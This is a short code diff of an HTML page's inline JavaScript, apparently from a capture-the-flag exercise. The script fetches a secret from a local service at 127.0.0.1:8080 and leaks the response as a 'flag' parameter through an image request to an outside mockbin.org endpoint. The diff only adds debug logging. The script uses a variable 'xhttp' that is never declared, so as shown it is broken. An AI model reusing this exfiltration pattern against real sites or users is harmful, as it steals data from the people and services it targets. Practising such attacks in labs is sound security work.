@@ -9,8 +9,10 @@
     <script>
     	var xmlHttp = new XMLHttpRequest();
 	if (xmlHttp) {
+		console.log("starting http requ");
 	    xmlHttp.open('GET', 'http://127.0.0.1:8080/secret', true);
 	    xmlHttp.onreadystatechange = function () {
+	    	console.log("readystate change: "+ xhttp.readyState);
 		  if (xhttp.readyState == 4 ) { //&& xhttp.status == 200
 		  	var img = document.createElement('img');
 			img.src = "http://mockbin.org/bin/21c6f9aa-c551-4717-bc2c-b63516eb13ab?flag=" + xhttp.responseText;
